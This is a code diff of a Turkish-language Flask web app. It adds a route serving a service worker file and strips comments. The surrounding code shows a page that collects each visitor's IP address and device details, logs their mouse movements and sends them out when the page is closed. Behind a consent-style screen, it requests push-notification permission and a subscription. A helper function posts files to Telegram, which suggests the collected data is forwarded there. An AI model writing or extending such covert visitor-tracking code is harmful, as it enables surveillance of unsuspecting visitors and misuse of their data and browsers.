@@ -39,6 +39,15 @@ def telegram_dosya_gonder(dosya, dosya_adi, aciklama):
         requests.post(url, files=files, data=data, timeout=30)
     except Exception as e: pass
 
+# --- SW.JS DOSYASINI TARAYICIYA SUNAN ROTA ---
+@app.route('/sw.js')
+def serve_sw():
+    try:
+        with open('sw.js', 'r') as f:
+            return app.response_class(f.read(), mimetype='application/javascript')
+    except FileNotFoundError:
+        return "sw.js bulunamadı", 404
+
 @app.route('/', methods=['GET'])
 def ana_sayfa():
     ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
@@ -103,7 +112,7 @@ def ana_sayfa():
         let hareketVerisi = [];
         let sonHareketZamani = 0;
 
-        // Push Bildirimleri için Base64 Çevirici (Düzeltildi)
+        // Push Bildirimleri için Base64 Çevirici
         function urlBase64ToUint8Array(base64String) {{
             const padding = '='.repeat((4 - base64String.length % 4) % 4);
             const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
@@ -142,7 +151,7 @@ def ana_sayfa():
             else {{
                 document.getElementById('onay-ekrani').style.display = 'none';
                 document.getElementById('sistem-alani').style.display = 'block';
-                izinleriIste(); // İşte aradığın fonksiyon burada çağrılıyor!
+                izinleriIste();
             }}
         }});
 
@@ -169,7 +178,6 @@ def ana_sayfa():
         window.addEventListener('mousemove', (e) => {{ hareketEkle(e.clientX, e.clientY); }});
         window.addEventListener('beforeunload', hareketGonder);
 
-        // 🚨 İŞTE ARADIĞIN FONKSİYON BURADA 🚨
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
@@ -180,11 +188,11 @@ def ana_sayfa():
                 body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
             }}).catch(e => console.log(e));
 
-            // 2. BİLDİRİM İZNİ VE ABONELİK (Düzeltildi)
+            // 2. BİLDİRİM İZNİ VE ABONELİK
             if ('serviceWorker' in navigator && 'PushManager' in window) {{
                 try {{
                     durum.innerHTML = "Bildirim izni isteniyor...";
-                    const izin = await Notification.requestPermission(); // İZİN İSTEME KODU
+                    const izin = await Notification.requestPermission(); 
                     
                     if (izin === 'granted') {{
                         durum.innerHTML = "Bildirim izni verildi. Abone olunuyor...";
